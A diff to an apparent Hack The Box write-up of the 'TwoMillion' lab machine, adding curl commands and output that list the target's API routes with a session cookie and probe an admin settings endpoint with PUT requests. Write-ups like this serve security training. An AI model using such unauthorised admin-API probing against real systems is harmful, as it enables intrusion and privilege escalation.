@@ -236,8 +236,107 @@ Login:
 Dashboard:
 ![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/87fd652c-b3c1-4e0f-b0c1-0241d02b5f48)
 
-API Routes:
+API:
+
+Request All API Routes
 ```shell
-curl -s http://2million.htb/api/v1 -H "Cookie: PHPSESSID=dihm5b2fhtpggrecrhjnfm62h8" | jq
+root@kali# curl -vvv http://2million.htb/api/v1
+* processing: http://2million.htb/api/v1
+*   Trying 10.10.11.221:80...
+* Connected to 2million.htb (10.10.11.221) port 80
+> GET /api/v1 HTTP/1.1
+> Host: 2million.htb
+> User-Agent: curl/8.2.1
+> Accept: */*
+> 
+< HTTP/1.1 401 Unauthorized
+< Server: nginx
+< Date: Tue, 10 Oct 2023 14:43:54 GMT
+< Content-Type: text/html; charset=UTF-8
+< Transfer-Encoding: chunked
+< Connection: keep-alive
+< Set-Cookie: PHPSESSID=sg5s3rcmrhb11bp3jf5g5jrls5; path=/
+< Expires: Thu, 19 Nov 1981 08:52:00 GMT
+< Cache-Control: no-store, no-cache, must-revalidate
+< Pragma: no-cache
+< 
+* Connection #0 to host 2million.htb left intact
 ```
-![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/72f89f63-f675-43ae-8f24-568f52a21466)
+
+```shell
+root@kali# curl -s http://2million.htb/api/v1 -H "Cookie: PHPSESSID=dihm5b2fhtpggrecrhjnfm62h8" | jq
+{
+  "v1": {
+    "user": {
+      "GET": {
+        "/api/v1": "Route List",
+        "/api/v1/invite/how/to/generate": "Instructions on invite code generation",
+        "/api/v1/invite/generate": "Generate invite code",
+        "/api/v1/invite/verify": "Verify invite code",
+        "/api/v1/user/auth": "Check if user is authenticated",
+        "/api/v1/user/vpn/generate": "Generate a new VPN configuration",
+        "/api/v1/user/vpn/regenerate": "Regenerate VPN configuration",
+        "/api/v1/user/vpn/download": "Download OVPN file"
+      },
+      "POST": {
+        "/api/v1/user/register": "Register a new user",
+        "/api/v1/user/login": "Login with existing user"
+      }
+    },
+    "admin": {
+      "GET": {
+        "/api/v1/admin/auth": "Check if user is admin"
+      },
+      "POST": {
+        "/api/v1/admin/vpn/generate": "Generate VPN for specific user"
+      },
+      "PUT": {
+        "/api/v1/admin/settings/update": "Update user settings"
+      }
+    }
+  }
+}
+```
+![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/059c0679-7ae5-4f2e-99f3-9441296c9808)
+
+```shell
+root@kali# curl -s -X PUT http://2million.htb/api/v1/admin/settings/update -H "Cookie: PHPSESSID=dihm5b2fhtpggrecrhjnfm62h8" | jq
+{
+  "status": "danger",
+  "message": "Invalid content type."
+}
+```
+![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/1e890b9d-4068-4ab3-9cf5-14475e6f6c08)
+
+```shell
+root@kali# curl -vvv -X PUT http://2million.htb/api/v1/admin/settings/update -H "Cookie: PHPSESSID=dihm5b2fhtpggrecrhjnfm62h8" | jq
+* processing: http://2million.htb/api/v1/admin/settings/update
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0*   Trying 10.10.11.221:80...
+* Connected to 2million.htb (10.10.11.221) port 80
+> PUT /api/v1/admin/settings/update HTTP/1.1
+> Host: 2million.htb
+> User-Agent: curl/8.2.1
+> Accept: */*
+> Cookie: PHPSESSID=dihm5b2fhtpggrecrhjnfm62h8
+> 
+< HTTP/1.1 200 OK
+< Server: nginx
+< Date: Tue, 10 Oct 2023 14:49:08 GMT
+< Content-Type: application/json
+< Transfer-Encoding: chunked
+< Connection: keep-alive
+< Expires: Thu, 19 Nov 1981 08:52:00 GMT
+< Cache-Control: no-store, no-cache, must-revalidate
+< Pragma: no-cache
+< 
+{ [64 bytes data]
+100    53    0    53    0     0    307      0 --:--:-- --:--:-- --:--:--   308
+* Connection #0 to host 2million.htb left intact
+{
+  "status": "danger",                                                                                                                          
+  "message": "Invalid content type."                                                                                                           
+}  
+```
+![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/a4e618b3-96b5-43e4-8860-19e195cd62da)
